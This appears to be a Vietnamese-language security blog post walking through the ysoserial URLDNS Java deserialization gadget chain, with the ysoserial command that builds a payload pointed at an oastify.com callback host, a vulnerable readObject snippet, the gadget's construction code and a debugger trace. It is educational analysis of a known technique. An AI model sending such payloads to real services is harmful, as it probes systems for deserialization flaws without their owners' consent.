---
layout: single
title: "Phân tích gadget URLDNS"
date: 2026-04-21 09:00:00 +0700
categories: [Java]
tags: [Java, Java Deserialize, URLDNS]
---


# Phân tích gadget URLDNS

## Setup

Tạo chain bằng `ysoserial`:

```powershell
# Switch Java về Java 8
┌──(DELL㉿DUNGNHV-LAPTOP)-[~/Desktop]
└─$ $env:JAVA_HOME="C:\Program Files\Java\jdk1.8.0_131"
┌──(DELL㉿DUNGNHV-LAPTOP)-[~/Desktop]
└─$ $env:PATH="$env:JAVA_HOME\bin;$env:PATH"
┌──(DELL㉿DUNGNHV-LAPTOP)-[~/Desktop]
└─$ java -version
java version "1.8.0_131"
Java(TM) SE Runtime Environment (build 1.8.0_131-b11)
Java HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)

# Gen payload (Sử dụng cmd để khi dùng > để ghi file không bị lỗi)
C:\Users\DELL\Desktop>java -jar "C:\Users\DELL\Desktop\ysoserial-all.jar" URLDNS "http://uxvhlhztrnzu2r8qnpskydq17sdj19py.oastify.com" > urldns1.ser
```

Đoạn code deserialize:

```java
package org.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;


public class Main {
    public static void main(String[] args) {
        System.out.println("Hello and welcome!");
        // Deserialize
        try (ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream("urldns.ser")
        )
        ) {
            Object obj = ois.readObject();
            System.out.println("Deserialized object:" + obj);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

Sau khi deserialize, đã có DNS đến RequestRepo:

<picture>
  <img src="https://dungnhvhust.github.io/images/ds01.png" data-src-ignore>
</picture>

## Debug gadget chain

### Tổng quan

Vì gadgetchain này lợi dụng class có sẵn trong Java nên ta không cần phải khai báo thêm thư viện gì cả

Sơ đồ gadgetchain URLDNS:

```
 HashMap.readObject()
    HashMap.hash()
      URL.hashCode()
        URLStreamHandler.hashCode()
          URLStreamHandler.getHostAddress()
            InetAddress.getByName()
```

Xem luôn cách ysoserial tạo payload ở [đây](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java#L14)

```java
      public Object getObject(final String url) throws Exception {
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
                return ht;
        }
```

Đầu tiên Object của class `URL` được tạo với `url` là input của ta, `handler` là Object của class `URLStreamHandler`.

Tiếp theo class `u` (URL) được put vào hashmap.

Cuối cùng dùng Reflection để thay đổi giá trị của property private `hashCode`. (Reflections : `import ysoserial.payloads.util.Reflections;`)

### Debug

Gadget này được trigger khi ta gọi `readObject()` của class `HashMap()` nên ta bắt đầu đặt breakpoint từ `HashMap`.

Mở InteliJ, nhấn `F1` để tìm file `HashMap.java` (Tích `Include non-project items`)

<picture>
  <img src="https://dungnhvhust.github.io/images/ds02.png" data-src-ignore>
</picture>

Trong file `HashMap.java` , `Ctrl F` để tìm hàm `readObject()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds03.png" data-src-ignore>
</picture>

Tại đây, nó sẽ loop qua từng key của `HashMap` và thực hiện `putVal(hash(key))`

```java
// Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
```

Đặt breakpoint đầu tiên tại đây để xem giá trị của `key`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds04.png" data-src-ignore>
</picture>

Ở đây `key` chính là object URL ta đã truyền vào.

Tiếp tục đặt breakpoint ở hàm `hash()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds05.png" data-src-ignore>
</picture>

Tiếp tục gọi đến `key.hashCode()` .Do ở đây `key` chính là Object `URL` ta truyền vào, nghĩa là đang gọi đến `URL.hashCode()`

Step into (`F11`) để nhảy vào method `hashCode()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds06.png" data-src-ignore>
</picture>

Method này sẽ kiểm tra giá trị của property hashCode có khác -1 hay không, nếu khác thì tiếp tục gọi đến `handler.hasCode()` còn nếu không thì return.

<picture>
  <img src="https://dungnhvhust.github.io/images/ds07.png" data-src-ignore>
</picture>

Do khi `put` `ht.put(u, url);` thì Object đã Object đã bị gọi `hashCode()` (tính toán và cache giá trị hash) dẫn đến property của `hashCode` khác `-1` nên sau khi `put`, cần sử dụng `Reflection` để thay đổi giá trị của `hashCode` trong runtime về lại `-1`.

Sau khi check điều kiện `hashCode != 1`,tiếp tục đến `handler.hashCode()`

`handler` là class của object `URLStreamHandler`

```java
transient URLStreamHandler handler;
```

Tiếp tục đặt breakpoint ở hàm `hashCode()` của `handler` ta thấy nó sẽ gọi đến `getHostAddress()` với `u` là class `URL` do ta truyền vào.

<picture>
  <img src="https://dungnhvhust.github.io/images/ds09.png" data-src-ignore>
</picture>

Tiếp tục debug, trong hàm `getHostAddress()` sẽ gọi đến `InetAddress.getByName()`
để resolve DNS đến host của ta.

<picture>
  <img src="https://dungnhvhust.github.io/images/ds10.png" data-src-ignore>
</picture>

Khi này ở RequestRepo sẽ thấy có DNS đến.

Vậy thì gadgetchain đầy đủ sẽ là:

```
HashMap.readObject()
    ->HashMap.putVal()
        ->HashMap.hash()
            ->URL.hashCode()
                ->URLStreamHandler.getHostAddress()
                    ->InetAddress.getByName()
```

Đây là gadgetchain đơn giản nhất trong các gadgetchain `ysoserial`, nó giúp có cái nhìn tổng quát về gadgetchain trong Java cũng như là học được cách debug trong InteliJ.


<script>
function forceLoadImages() {
  document.querySelectorAll("img").forEach(img => {
    if (img.dataset && img.dataset.src) {
      img.src = img.dataset.src;
      img.removeAttribute("lazyload");
    }
  });
}

// chạy lần đầu
forceLoadImages();

// chạy lại mỗi khi Swup load page
document.addEventListener("swup:contentReplaced", forceLoadImages);
</script>